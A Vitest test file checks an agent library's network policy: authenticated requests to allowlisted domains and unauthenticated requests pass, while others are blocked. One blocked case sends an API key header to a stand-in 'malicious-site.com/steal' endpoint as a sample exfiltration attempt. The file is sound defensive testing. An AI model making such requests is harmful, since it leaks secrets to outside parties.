import { describe, it, expect, vi } from 'vitest';
import axios from 'axios';
import { secureFetch } from '@agent/core';

// Manual spy approach
const axiosSpy = vi.spyOn(axios, 'default').mockResolvedValue({ data: { success: true } });

describe('Network Governance Policy Enforcement', () => {
  
  it('Scenario: Authenticated request to whitelisted domain (Allowed)', async () => {
    const result = await secureFetch({
      url: 'https://api.github.com/user',
      headers: { 'Authorization': 'Bearer test-token' }
    });
    expect(result.success).toBe(true);
  });

  it('Scenario: Authenticated request to non-whitelisted domain (Blocked)', async () => {
    try {
      await secureFetch({
        url: 'https://malicious-site.com/steal',
        headers: { 'X-API-KEY': 'secret-key' }
      });
      throw new Error('Should have been blocked');
    } catch (err: any) {
      expect(err.message).toContain('[NETWORK_POLICY_VIOLATION]');
    }
  });

  it('Scenario: Unauthenticated request to any domain (Allowed by default)', async () => {
    const result = await secureFetch({
      url: 'https://any-public-site.com/data'
    });
    expect(result.success).toBe(true);
  });
});
